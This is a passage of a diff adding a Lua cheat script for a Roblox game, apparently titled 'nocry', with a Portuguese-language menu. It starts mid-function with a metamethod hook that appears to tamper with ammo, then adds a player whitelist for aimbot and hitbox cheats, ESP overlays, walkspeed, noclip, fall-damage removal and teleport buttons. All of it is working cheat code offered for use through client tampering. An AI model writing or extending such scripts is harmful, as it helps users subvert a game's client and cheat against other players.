+                hookmetamethod(game, "__index", ammoHook)
+                ammoHook = nil
+            end
+        end
+    end
+})
+
+-- ============================================================
+--  ABA: COMBAT — Whitelist
+-- ============================================================
+local WhitelistSection = Tabs.Combat:AddSection("Whitelist")
+
+WhitelistSection:AddToggle("WhitelistAtivo", {
+    Title       = "Ativar Whitelist",
+    Description = "Aimbot, Hitbox e ESP ignoram jogadores na lista",
+    Default     = false,
+    Callback    = function(v) WhitelistAtivo = v end
+})
+
+local function GetServerPlayers()
+    local lista = {}
+    for _, p in ipairs(Players:GetPlayers()) do
+        if p ~= LocalPlayer then
+            table.insert(lista, p.Name)
+        end
+    end
+    table.sort(lista)
+    return lista
+end
+
+WhitelistSection:AddDropdown("WhitelistJogadores", {
+    Title       = "Jogadores no Servidor",
+    Description = "Marque para proteger / desmarque para remover",
+    Values      = GetServerPlayers(),
+    Default     = {},
+    Multi       = true,
+    Callback    = function(selecionados)
+        Whitelist = {}
+        for nome, marcado in pairs(selecionados) do
+            if marcado then Whitelist[nome] = true end
+        end
+    end
+})
+
+WhitelistSection:AddButton({
+    Title    = "Atualizar Lista",
+    Callback = function()
+        local lista = GetServerPlayers()
+        Options["WhitelistJogadores"]:SetValues(lista)
+        Fluent:Notify({ Title = "Whitelist", Content = "Lista atualizada! " .. #lista .. " jogador(es).", Duration = 3 })
+    end
+})
+
+-- ============================================================
+--  ABA: ESP — UI
+-- ============================================================
+local EspSection = Tabs.Esp:AddSection("Visuais")
+
+EspSection:AddToggle("EspChams", {
+    Title    = "Esp Chams",
+    Default  = false,
+    Callback = function(v) EspChams = v end
+})
+
+EspSection:AddToggle("EspBillboard", {
+    Title    = "Esp Billboard",
+    Default  = false,
+    Callback = function(v) EspBillboard = v end
+})
+
+EspSection:AddToggle("EspBox", {
+    Title    = "Esp Box (2D)",
+    Default  = false,
+    Callback = function(v) EspBox = v end
+})
+
+EspSection:AddToggle("EspSkeleton", {
+    Title    = "Esp Skeleton",
+    Default  = false,
+    Callback = function(v) EspSkeleton = v end
+})
+
+EspSection:AddToggle("EspLine", {
+    Title    = "Esp Line",
+    Default  = false,
+    Callback = function(v) EspLine = v end
+})
+
+local EspSettings = Tabs.Esp:AddSection("Settings")
+
+EspSettings:AddDropdown("LinePositionDropdown", {
+    Title    = "Line Position",
+    Values   = { "Normal", "Top", "Bottom", "Left", "Right" },
+    Default  = 3, -- Bottom como padrão
+    Callback = function(v) LinePosition = v end
+})
+
+-- ============================================================
+--  ABA: MOVIMENTO
+-- ============================================================
+local MovSection = Tabs.Movimento:AddSection("Player")
+
+MovSection:AddToggle("Walkspeed", {
+    Title    = "Walkspeed",
+    Default  = false,
+    Callback = function(v)
+        WalkspeedOn = v
+        local char = LocalPlayer.Character
+        if char then
+            local hum = char:FindFirstChildOfClass("Humanoid")
+            if hum then hum.WalkSpeed = v and SpeedValue or 16 end
+        end
+    end
+})
+
+local noclipConnection = nil
+MovSection:AddToggle("Noclip", {
+    Title    = "Noclip",
+    Default  = false,
+    Callback = function(v)
+        NoclipOn = v
+        if v then
+            noclipConnection = RunService.Stepped:Connect(function()
+                if NoclipOn then
+                    local char = LocalPlayer.Character
+                    if char then
+                        for _, part in ipairs(char:GetDescendants()) do
+                            if part:IsA("BasePart") then part.CanCollide = false end
+                        end
+                    end
+                end
+            end)
+        else
+            if noclipConnection then
+                noclipConnection:Disconnect()
+                noclipConnection = nil
+            end
+        end
+    end
+})
+
+MovSection:AddToggle("SemDanoQueda", {
+    Title    = "Sem Dano de Queda",
+    Default  = false,
+    Callback = function(v)
+        SemDanoQueda = v
+        local char = LocalPlayer.Character
+        if char then
+            local hum = char:FindFirstChildOfClass("Humanoid")
+            if hum then
+                hum:SetStateEnabled(Enum.HumanoidStateType.FallingDown, not v)
+                hum:SetStateEnabled(Enum.HumanoidStateType.Landed,      not v)
+            end
+        end
+    end
+})
+
+MovSection:AddToggle("TeleportTool", {
+    Title    = "Teleport Tool",
+    Default  = false,
+    Callback = function(v) TeleportTool = v end
+})
+
+local MovSettings = Tabs.Movimento:AddSection("Speed")
+
+MovSettings:AddSlider("SpeedValue", {
+    Title    = "Speed Value",
+    Min      = 16,
+    Max      = 500,
+    Default  = 16,
+    Rounding = 0,
+    Callback = function(v)
+        SpeedValue = v
+        if WalkspeedOn then
+            local char = LocalPlayer.Character
+            if char then
+                local hum = char:FindFirstChildOfClass("Humanoid")
+                if hum then hum.WalkSpeed = v end
+            end
+        end
+    end
+})
+
+local TeleportSection = Tabs.Movimento:AddSection("Teleports")
+
+local teleportes = {
+    { "Prefeitura",    Vector3.new(0, 5, 0) },
+    { "Banco",         Vector3.new(0, 5, 0) },
+    { "Praça",         Vector3.new(3610.77, 8.51, 2896.41) },
+    { "Hospital",      Vector3.new(3908.39, 4.65, 2100.52) },
+    { "Garagem Praça", Vector3.new(0, 5, 0) },
+}
+
+for _, tp in ipairs(teleportes) do
+    local nome, pos = tp[1], tp[2]
+    TeleportSection:AddButton({
+        Title    = nome,
+        Callback = function()
+            local char = LocalPlayer.Character
+            if char and char:FindFirstChild("HumanoidRootPart") then
+                char.HumanoidRootPart.CFrame = CFrame.new(pos)
+                Fluent:Notify({ Title = "Teleporte", Content = "Teleportado para " .. nome .. "!", Duration = 3 })
+            end
+        end
+    })
+end
+
+-- ============================================================
+--  MINIMIZE CUSTOM
+-- ============================================================
+local playerGui = LocalPlayer:WaitForChild("PlayerGui")
+
+local minimizeGui = Instance.new("ScreenGui")
+minimizeGui.Name         = "MinimizeIcon"
+minimizeGui.ResetOnSpawn = false
+minimizeGui.Parent       = playerGui
+
+local buttonFrame = Instance.new("Frame")
+buttonFrame.Name                   = "MinimizeFrame"
+buttonFrame.Size                   = UDim2.fromOffset(90, 90)
+buttonFrame.Position               = UDim2.new(1, -110, 1, -110)
+buttonFrame.BackgroundTransparency = 1
+buttonFrame.BorderSizePixel        = 0
+buttonFrame.Parent                 = minimizeGui
+
+local minimizeIcon = Instance.new("ImageButton")
+minimizeIcon.Name                   = "Icon"
+minimizeIcon.Size                   = UDim2.fromScale(1, 1)
+minimizeIcon.Position               = UDim2.fromScale(0, 0)
+minimizeIcon.BackgroundTransparency = 1
+minimizeIcon.Image                  = "rbxassetid://94974019799974"
+minimizeIcon.ScaleType              = Enum.ScaleType.Fit
+minimizeIcon.ResampleMode           = Enum.ResamplerMode.Default
+minimizeIcon.Parent                 = buttonFrame
+
+local tweenInfo   = TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+local hoverTween  = TweenService:Create(minimizeIcon, tweenInfo, { Size = UDim2.fromScale(1.12, 1.12), ImageTransparency = 0.15 })
+local normalTween = TweenService:Create(minimizeIcon, tweenInfo, { Size = UDim2.fromScale(1, 1),        ImageTransparency = 0    })
+
+minimizeIcon.MouseEnter:Connect(function() hoverTween:Play()  end)
+minimizeIcon.MouseLeave:Connect(function() normalTween:Play() end)
+
+local dragging = false
+local dragStart, startPos
+
+minimizeIcon.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging  = true
+        dragStart = input.Position
+        startPos  = buttonFrame.Position
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
+end)
+
+minimizeIcon.InputChanged:Connect(function(input)
+    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+        local delta = input.Position - dragStart
+        buttonFrame.Position = UDim2.new(
+            startPos.X.Scale, startPos.X.Offset + delta.X,
+            startPos.Y.Scale, startPos.Y.Offset + delta.Y
+        )
+    end
+end)
+
+UserInputService.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = false
+    end
+end)
+
+minimizeIcon.Activated:Connect(function()
+    Window:Minimize()
+end)
+
+-- ============================================================
+--  INICIALIZAÇÃO
+-- ============================================================
+SaveManager:SetLibrary(Fluent)
+InterfaceManager:SetLibrary(Fluent)
+InterfaceManager:SetFolder("nocry")
+SaveManager:SetFolder("nocry/configs")
+InterfaceManager:BuildInterfaceSection(Tabs.Config)
+SaveManager:BuildConfigSection(Tabs.Config)
+
+SaveManager:LoadAutoloadConfig()
+Fluent:SelectTab(Tabs.Combat)
+Fluent:Notify({ Title = "nocry", Content = "UI carregada! by menojz 🚀", Duration = 5 })
